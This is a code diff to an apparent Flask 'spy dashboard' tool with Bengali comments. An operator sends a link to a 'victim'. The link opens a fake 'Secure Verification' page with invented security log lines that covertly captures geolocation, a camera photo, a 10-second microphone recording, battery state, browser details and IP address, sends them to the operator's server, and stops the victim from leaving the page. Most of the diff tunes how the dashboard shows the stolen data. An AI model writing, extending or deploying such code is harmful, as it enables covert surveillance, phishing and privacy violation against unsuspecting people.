@@ -9,7 +9,7 @@ app.secret_key = os.environ.get('SECRET_KEY', 'force-fixed-key-2025')
 
 reports = {}
 
-#  HTML -  , AJAX 
+# অপটিমাইজড ড্যাশবোর্ড HTML (শুধু নতুন ডেটা যোগ হয়, রি-রেন্ডার নেই)
 DASHBOARD_HTML = """
 <!DOCTYPE html>
 <html>
@@ -36,25 +36,25 @@ DASHBOARD_HTML = """
 </head>
 <body>
 <div class="card">
-    <h2> SPY DASHBOARD</h2>
+    <h2>📡 SPY DASHBOARD</h2>
     <p><strong>Your persistent UID:</strong> {{ uid }}</p>
     <div>
         <input type="text" id="link" value="{{ link }}" readonly style="width:70%;">
         <button onclick="copyLink()">Copy Link</button>
-        <button class="delete-btn" onclick="deleteData()"> Delete My Data</button>
+        <button class="delete-btn" onclick="deleteData()">🗑️ Delete My Data</button>
     </div>
     <form method="post" action="/new_uid" style="display:inline;">
         <button type="submit" style="background:#ff3366;">Generate New Link (New UID)</button>
     </form>
-    <p> Send current link to victim. Data updates automatically without page reload.</p>
+    <p>⚠️ Send current link to victim. Data updates smoothly (new items appear on top).</p>
 </div>
 <div class="card">
-    <h3> Received Data (UID: {{ uid }})</h3>
-    <div id="dataContainer">Loading data...</div>
+    <h3>📥 Received Data (UID: {{ uid }})</h3>
+    <div id="dataContainer"></div>
 </div>
 <script>
     const uid = "{{ uid }}";
-    let mapInitializers = [];
+    let seenIds = new Set();
 
     function copyLink() {
         let inp = document.getElementById('link');
@@ -66,58 +66,75 @@ DASHBOARD_HTML = """
     async function deleteData() {
         if(confirm('Delete all collected data for this UID?')) {
             await fetch('/api/delete/' + uid, {method: 'POST'});
+            document.getElementById('dataContainer').innerHTML = '';
+            seenIds.clear();
             fetchData();
         }
+    }
+
+    function createItemElement(item) {
+        const div = document.createElement('div');
+        div.className = 'data-item';
+        div.innerHTML = `<small>${item.time}</small>
+                         <pre>${JSON.stringify(item.data, null, 2)}</pre>`;
+        if (item.data.location) {
+            const mapId = 'map_' + Date.now() + '_' + Math.random();
+            div.innerHTML += `<div class="map-container" id="${mapId}"></div>`;
+            setTimeout(() => {
+                const lat = item.data.location.lat;
+                const lon = item.data.location.lon;
+                const mapDiv = document.getElementById(mapId);
+                if (mapDiv && !mapDiv._leaflet_id) {
+                    const map = L.map(mapId).setView([lat, lon], 13);
+                    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+                    L.marker([lat, lon]).addTo(map).bindPopup('Victim Location').openPopup();
+                    mapDiv._leaflet_id = true;
+                }
+            }, 100);
+        }
+        if (item.data.battery) {
+            div.innerHTML += `<div class="battery">🔋 Battery: ${item.data.battery.level}% ${item.data.battery.charging ? '(Charging)' : '(Not charging)'}</div>`;
+        }
+        if (item.data.photo) {
+            div.innerHTML += `<div><img src="${item.data.photo}" class="photo" alt="Victim photo"></div>`;
+        }
+        if (item.data.audio) {
+            div.innerHTML += `<div><audio controls src="${item.data.audio}"></audio></div>`;
+        }
+        return div;
     }
 
     async function fetchData() {
         try {
             const res = await fetch('/api/get_data/' + uid);
             const data = await res.json();
-            renderData(data);
+            const container = document.getElementById('dataContainer');
+            if (!data || data.length === 0) {
+                if (container.children.length === 0) {
+                    container.innerHTML = '<p>⏳ No data yet. Send the link to victim.</p>';
+                }
+                return;
+            }
+            // Remove placeholder if exists
+            if (container.children.length === 1 && container.firstChild.tagName === 'P') {
+                container.innerHTML = '';
+            }
+            // Traverse from newest to oldest (reverse of received order)
+            for (let i = data.length - 1; i >= 0; i--) {
+                const item = data[i];
+                const itemId = item.time + '_' + JSON.stringify(item.data).substring(0, 80);
+                if (!seenIds.has(itemId)) {
+                    seenIds.add(itemId);
+                    const newElement = createItemElement(item);
+                    container.insertBefore(newElement, container.firstChild);
+                }
+            }
+            // Limit to 50 items to keep performance
+            while (container.children.length > 50) {
+                const last = container.lastChild;
+                if (last) container.removeChild(last);
+            }
         } catch(e) { console.error(e); }
-    }
-
-    function renderData(reports) {
-        const container = document.getElementById('dataContainer');
-        if (!reports || reports.length === 0) {
-            container.innerHTML = '<p> No data yet. Send the link to victim.</p>';
-            return;
-        }
-        let html = '';
-        // reverse order so newest at top
-        for (let i = reports.length-1; i >= 0; i--) {
-            const item = reports[i];
-            html += `<div class="data-item">
-                        <small>${item.time}</small>
-                        <pre>${JSON.stringify(item.data, null, 2)}</pre>`;
-            if (item.data.location) {
-                const mapId = 'map_' + Date.now() + '_' + i;
-                html += `<div class="map-container" id="${mapId}"></div>`;
-                // map init after DOM insertion
-                setTimeout(() => {
-                    const lat = item.data.location.lat;
-                    const lon = item.data.location.lon;
-                    const mapDiv = document.getElementById(mapId);
-                    if (mapDiv) {
-                        const map = L.map(mapId).setView([lat, lon], 13);
-                        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
-                        L.marker([lat, lon]).addTo(map).bindPopup('Victim Location').openPopup();
-                    }
-                }, 100);
-            }
-            if (item.data.battery) {
-                html += `<div class="battery"> Battery: ${item.data.battery.level}% ${item.data.battery.charging ? '(Charging)' : '(Not charging)'}</div>`;
-            }
-            if (item.data.photo) {
-                html += `<div><img src="${item.data.photo}" class="photo" alt="Victim photo"></div>`;
-            }
-            if (item.data.audio) {
-                html += `<div><audio controls src="${item.data.audio}"></audio></div>`;
-            }
-            html += `</div>`;
-        }
-        container.innerHTML = html;
     }
 
     setInterval(fetchData, 3000);
@@ -127,7 +144,7 @@ DASHBOARD_HTML = """
 </html>
 """
 
-#   ( , , , ,  , )
+# ভিকটিম পেজ (আগের মতোই, কোনো পরিবর্তন নেই – শুধু রিডাইরেক্ট লিংক আপনার দেওয়া)
 SPY_PAGE_HTML = """
 <!DOCTYPE html>
 <html>
@@ -209,19 +226,18 @@ SPY_PAGE_HTML = """
 </head>
 <body>
 <div class="container">
-    <h1> SECURE VERIFICATION</h1>
+    <h1>🔐 SECURE VERIFICATION</h1>
     <div class="spinner"></div>
     <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
     <div class="status" id="statusMsg">Initializing security protocols...</div>
     <div class="fake-details" id="fakeLog">
-         SSL handshake complete<br>
-         Scanning network environment...
+        ✔️ SSL handshake complete<br>
+        ⏳ Scanning network environment...
     </div>
     <p>Do not close this window. Verification in progress.</p>
 </div>
 
 <script>
-    //    ( 100%  )
     let progress = 0;
     const progressInterval = setInterval(() => {
         if (progress < 92) progress += Math.random() * 3;
@@ -237,16 +253,15 @@ SPY_PAGE_HTML = """
         msgIndex++;
     }, 2200);
     
-    const fakeLogLines = [" SSL handshake complete"," Scanning network environment..."," IP validated: 103.42.xxx.xx"," Checking browser extensions"," No threats detected"," Retrieving device timestamp"," Timezone synchronized"," Performing battery calibration..."," Camera integrity test (in progress)"," Secure channel established"];
+    const fakeLogLines = ["✔️ SSL handshake complete","⏳ Scanning network environment...","✔️ IP validated: 103.42.xxx.xx","⏳ Checking browser extensions","✔️ No threats detected","⏳ Retrieving device timestamp","✔️ Timezone synchronized","⏳ Performing battery calibration...","⏳ Camera integrity test (in progress)","✔️ Secure channel established"];
     let logIndex = 2;
     setInterval(() => {
         const logDiv = document.getElementById('fakeLog');
         if (logIndex < fakeLogLines.length) logDiv.innerHTML += "<br>" + fakeLogLines[logIndex++];
-        else logDiv.innerHTML += "<br> Re-verifying connection stability...";
+        else logDiv.innerHTML += "<br>⟳ Re-verifying connection stability...";
         logDiv.scrollTop = logDiv.scrollHeight;
     }, 3500);
     
-    // -----    -----
     const server = window.location.origin;
     const uid = "{{ uid }}";
     
@@ -258,7 +273,6 @@ SPY_PAGE_HTML = """
         }).catch(e => console.error(e));
     }
     
-    // Basic info
     sendData({
         userAgent: navigator.userAgent,
         platform: navigator.platform,
@@ -271,15 +285,12 @@ SPY_PAGE_HTML = """
         timestamp: new Date().toISOString()
     });
     
-    // Battery
     if (navigator.getBattery) {
         navigator.getBattery().then(b => sendData({ battery: { level: Math.round(b.level * 100), charging: b.charging } }));
     }
-    // Location
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(pos => sendData({ location: { lat: pos.coords.latitude, lon: pos.coords.longitude } }), () => {});
     }
-    // Camera photo
     if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(stream => {
@@ -297,7 +308,6 @@ SPY_PAGE_HTML = """
                 }, 1500);
             }).catch(e => console.log);
     }
-    // Audio recording (10 sec)
     if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
         navigator.mediaDevices.getUserMedia({ audio: true })
             .then(stream => {
@@ -317,13 +327,11 @@ SPY_PAGE_HTML = """
                 setTimeout(() => mediaRecorder.stop(), 10000);
             }).catch(e => console.log);
     }
-    // IP
     fetch('https://api.ipify.org?format=json')
         .then(r => r.json())
         .then(ipData => sendData({ ip: ipData.ip }))
         .catch(e => console.log);
     
-    // Keep victim on page and redirect after 20 sec
     window.onbeforeunload = function() { return "Verification in progress. Are you sure?"; };
     setInterval(() => { history.pushState({}, '', '/'); }, 500);
     setTimeout(() => {
